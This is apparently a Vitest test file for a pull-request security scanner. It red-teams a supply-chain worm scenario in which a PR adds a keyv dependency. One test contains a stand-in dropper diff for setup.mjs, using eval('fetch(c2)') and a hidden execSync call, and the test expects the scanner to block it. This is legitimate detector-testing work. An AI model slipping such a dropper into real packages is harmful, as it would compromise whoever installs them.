import { describe, it, expect, beforeAll } from 'vitest'
import { scanPRFiles } from '../../src/scanner/index'
import { verifyScanAttestation } from '../../src/crypto/attestation'
import { initHmacKey } from '../../src/crypto/signing'
import type { PRFile } from '../../src/scanner/rules'

/**
 * RED TEAM: ChainDrop / Shai-Hulud supply-chain worm (2026-08-04)
 *
 * A consumer PR merely adds `"keyv": "^6.0.0"` to package.json while the real
 * malware lives in the published tarball (dropper setup.mjs + obfuscated bundle).
 * The Oracle only ever sees the manifest line — that evidence is insufficient to
 * PASS. Regression: state must be REVIEW, never silent PASS.
 */

function makeFile(overrides: Partial<PRFile> & { filename: string }): PRFile {
  return { status: 'modified', additions: 10, deletions: 0, patch: '', contents_url: '', ...overrides }
}

describe('Red Team: ChainDrop supply-chain scenario', () => {
  beforeAll(() => {
    initHmacKey(Buffer.from('redteam-chaindrop-key', 'utf8'))
  })

  it('consumer PR adding keyv@^6.0.0 is REVIEW (insufficient evidence), not PASS', async () => {
    const files: PRFile[] = [
      makeFile({
        filename: 'package.json',
        additions: 2,
        patch: '  "dependencies": {\n+"keyv": "^6.0.0"\n  }',
      }),
    ]
    const result = await scanPRFiles(files, 42, 'acme', 'payments', 'deadbeef', 'scanhash-1')
    expect(result.state).toBe('REVIEW')
    expect(result.stateReasons.some(r => r.includes('keyv'))).toBe(true)
    expect(result.stateReasons.some(r => r.includes('not independently verified'))).toBe(true)
    expect(result.attestation.state).toBe('REVIEW')
    expect(verifyScanAttestation(result.attestation).valid).toBe(true)
  })

  it('attacker dep change plus eval payload in the diff is BLOCK', async () => {
    const files: PRFile[] = [
      makeFile({ filename: 'package.json', additions: 2, patch: '  "dependencies": {\n+"keyv": "^6.0.0"\n  }' }),
      makeFile({ filename: 'setup.mjs', additions: 3, patch: '+import { execSync } from "node:child_process";\n+eval("fetch(c2)");\n+execSync("node math_init.js", { stdio: "ignore" });' }),
    ]
    const result = await scanPRFiles(files, 43, 'acme', 'payments', 'cafebabe', 'scanhash-2')
    expect(result.state).toBe('BLOCK')
    expect(result.attestation.state).toBe('BLOCK')
    expect(verifyScanAttestation(result.attestation).valid).toBe(true)
  })

  it('clean refactor without dependency changes PASSes', async () => {
    const files: PRFile[] = [
      makeFile({ filename: 'src/util.ts', additions: 1, patch: '+const add = (a: number, b: number) => a + b;' }),
    ]
    const result = await scanPRFiles(files, 44, 'acme', 'payments', 'feedface', 'scanhash-3')
    expect(result.state).toBe('PASS')
    expect(result.attestation.state).toBe('PASS')
    expect(verifyScanAttestation(result.attestation).valid).toBe(true)
  })
})
